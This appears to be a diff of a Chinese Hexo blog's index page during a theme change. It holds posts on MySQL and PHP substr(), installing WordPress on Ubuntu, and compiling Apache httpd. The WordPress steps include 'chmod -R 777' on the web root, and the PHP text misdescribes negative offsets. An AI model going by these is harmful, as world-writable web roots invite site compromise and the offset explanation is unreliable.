+    <article id="post-3" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/03/30/3/" class="article-date">
+      <time datetime="2019-03-30T13:15:11.000Z" itemprop="datePublished">2019-03-30</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/30/3/">MySQL中的substr函数与PHP中的substr函数</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p><strong>MySQL–substr()</strong><br>    MySQL中的substr()函数是用来截取数据库某一列字段中的一部分<br>    常用方式是：<br>    <code>substr(str,pos);</code><br>    就是从pos开始的位置，一直截取到最后。<br>    <code>substr(str,pos,len);</code><br>    这种表示的意思是从pos开始的位置，截取len个字符（空白也算字符）。<br>    需要注意的是：如果pos为1（而不是0），表示从第一个开始。因为数据库的记录都是从1开始而没有从0开始<br>    博文原地址：<a href="https://www.cnblogs.com/quietwalk/p/6478900.html" target="_blank" rel="noopener">https://www.cnblogs.com/quietwalk/p/6478900.html</a></p>
 <h3 id="二"><a href="#二" class="headerlink" title="二"></a>二</h3><p><strong>PHPsubstr()</strong><br><code>substr(string,start,length)</code><br>    参数：<br>    1、string即你要截取的字符串<br>    2、start即要截取的开始位置（0表示从前往后数第一个字符开始，负数表示从后往前数）<br>        举个栗子：length=3，表示截取三个长度；length=-2，即为去掉末尾的两个字符<br>    示例：<br>    A     <code>echo substr(&quot;hello world&quot;,-10,-2);</code><br>        输出： ello wor<br>        解释：-10表示从前往后的第十个字符开始截取，即从字母e开始截取(空格也算字符)；<br>                  -2表示去掉末尾两个字符即去掉’ld’；<br>    B     <code>echo substr(&quot;hello world&quot;,6,6);</code><br>        输出：  world<br>        解释：6表示从第七个字符开始截取(大白话就是从头开始数六个字符然后截取)；<br>              6表示截取6个长度；<br>  最后一句话解释substr函数用法：<br>        <code>&lt;?php echo substr(&quot;Hello world!&quot;,6); 输出world! ,只有两个参数时，第一个参数表示字符串，第二个参数表示，从第6个开始，后面的全部截取?&gt;</code><br>         <code>&lt;?php echo substr(&quot;Hello world!&quot;,6,4); 输出worl，有三个参数时，第二个参数表示起始位置，第三个参数为一共截取的长度?&gt;</code><br>           博文原地址：<a href="https://www.jb51.net/article/128898.htm" target="_blank" rel="noopener">https://www.jb51.net/article/128898.htm</a></p>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2018/12/07/作业四/">
-                在ubuntu上搭建wordpress
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2018-12-07</span>
-            
-            
-            
-        </div>
+      
+      
     </div>
-
     
-        <div class="content">
-            <p><strong>1. 安装apache2</strong></p>
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-作业四" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/12/07/作业四/" class="article-date">
+      <time datetime="2018-12-07T07:02:18.000Z" itemprop="datePublished">2018-12-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/07/作业四/">在ubuntu上搭建wordpress</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><strong>1. 安装apache2</strong></p>
 <p><code>sudo apt-get install apache2 -y</code></p>
 <p>进行资源更新，在终端输入：<br><code>sudo apt-get update</code></p>
 <p>进行包更新，输入：<br><code>sudo apt-get upgrade -y</code></p>
@@ -449,32 +744,60 @@
 <p><strong>6. 配置wordpress环境</strong><br>将wordpress的目录移动到默认路径并授权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo mv wordpress/* /var/www/html/</span><br><span class="line">sudo chmod -R 777 /var/www/html/</span><br><span class="line">sudo mv /var/www/html/index.html /var/www/html/index~.html</span><br><span class="line">sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure></p>
 <p><strong>配置完成</strong></p>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2018/12/04/作业三/">
-                Httpd编译安装
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2018-12-04</span>
-            
-            
-            
-        </div>
+      
+      
     </div>
-
     
-        <div class="content">
-            <p><strong>1.</strong>使用命令：yum groupinstall “Development Tools” -y  安装开发者套件</p>
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-作业三" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/12/04/作业三/" class="article-date">
+      <time datetime="2018-12-04T03:08:58.932Z" itemprop="datePublished">2018-12-04</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/04/作业三/">Httpd编译安装</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><strong>1.</strong>使用命令：yum groupinstall “Development Tools” -y  安装开发者套件</p>
 <p><strong>2.</strong>cd至 /usr/local/src/路径下下载源码包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache//apr/apr-1.6.5.tar.gz</span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache//apr/apr-util-1.6.1.tar.gz</span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/httpd/httpd-2.4.37.tar.gz</span><br></pre></td></tr></table></figure></p>
 <p><strong><em>备注</em></strong>：三个源码包都放在/usr/local/src/  （记得解压源码包）</p>
 <p><strong>3</strong>.安装源码包<br><strong>3.1</strong>安装apr-1.6.5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/src/</span><br><span class="line">cp -r apr-1.6.5  /usr/local/src/httpd-2.4.37/srclib/apr</span><br><span class="line">cd apr-1.6.5</span><br><span class="line">./configure --prefix=/usr/local/apr</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
@@ -486,186 +809,128 @@
 <p><strong>设置开机自启动：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig  --add  httpd</span><br></pre></td></tr></table></figure></p>
 <p><strong>配置文件路径：*</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/apache2.4/conf/httpd.conf</span><br></pre></td></tr></table></figure></p>
 
-        </div>
+      
+      
+    </div>
     
+    <div class="article-info article-info-index">
+      
+      
 
-</div>
-            
-        </section>
+      
+      
+      <div class="clearfix"></div>
     </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+  
 </div>
-
-
-
-
-
-
-</div>
-
-<!-- Footer -->
-<div class="push"></div>
-
-<footer class="footer-content">
-    <div class="container">
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
-                <h2>About</h2>
-                <p>
-                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
-                </p>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 iatk
             </div>
-            
-    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
-        <h2>Recent Posts</h2>
-        <ul>
-            
-            <li>
-                <a class="footer-post" href="/2019/04/27/解析漏洞/">解析漏洞</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2019/04/27/图片马制作/">图片马制作的几种方式</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2019/04/13/python2与python3在Windows中共存/">python2与python3在Windows中共</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2019/04/12/SQL注入/">SQL注入</a>
-            </li>
-            
-        </ul>
-    </div>
-
-
-
-            
-        </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <ul class="list-inline footer-social-icons">
-                    
-                    <li class="list-inline-item">
-                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-github"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://twitter.com/?lang=en">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-twitter"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://www.facebook.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-facebook"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://www.instagram.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-instagram"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://dribbble.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-dribbble"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://plus.google.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-google-plus"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://www.behance.net/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-behance"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://500px.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-500px"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="mailto:test@example.com">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-envelope-o"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="\#">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-rss"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                </ul>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
             </div>
         </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <div class="footer-copyright">
-                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
-                </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit">海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
             </div>
-        </div>
+        
     </div>
 </footer>
 
-<!-- After footer scripts -->
-
-<!-- jQuery -->
-<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
-
-<!-- Tween Max -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
-
-<!-- Gallery -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
-
-<!-- Custom JavaScript -->
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 <script src="/js/main.js"></script>
 
-<!-- Disqus Comments -->
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
 
 
 
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
 </body>
-
 </html>
